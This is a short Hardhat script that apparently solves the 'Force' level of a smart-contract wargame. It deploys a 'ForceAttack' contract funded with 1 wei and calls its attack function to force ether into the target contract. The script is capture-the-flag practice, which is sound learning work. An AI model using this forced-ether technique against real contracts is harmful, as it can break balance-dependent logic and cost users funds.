import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0x8aCd85898458400f7Db866d53FCFF6f0D49741FF";
const PLAYER_ADDRESS = "0x976EA74026E726554dB657fA54763abd0C3a0aa9";

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("Force", CONTRACT_ADDRESS, signer);

    const attackerFactory = await ethers.getContractFactory("ForceAttack");
    const attackerContract = await attackerFactory.deploy({ value: 1 });

    attackerContract.attack(CONTRACT_ADDRESS);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
